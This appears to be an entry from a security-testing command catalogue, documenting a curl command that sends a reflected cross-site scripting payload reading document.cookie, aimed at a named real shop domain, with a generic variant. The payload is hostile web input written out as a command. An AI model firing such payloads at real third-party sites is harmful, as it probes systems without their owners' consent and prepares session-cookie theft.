---
id: cmd-curl-xss-payload
data: 'curl "https://shop.starbucks.de/<>javascript:alert(document.cookie);"'
tags:
  - xss
  - web-testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:23.367Z'
verified: false
validated: true
submitted: true
---
# curl-xss-payload

## Command

```bash
curl "https://shop.starbucks.de/<>javascript:alert(document.cookie);"
```

## Description

Sends XSS payload to test reflected execution (best in browser).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL with payload | Includes '<>javascript:...' | Yes |

## Examples

### Basic Usage

```bash
curl "https://site/<>javascript:alert(1);"
```

## Expected Output

HTML response; JS executes in browser.

## Related

- [[Related Procedure]]
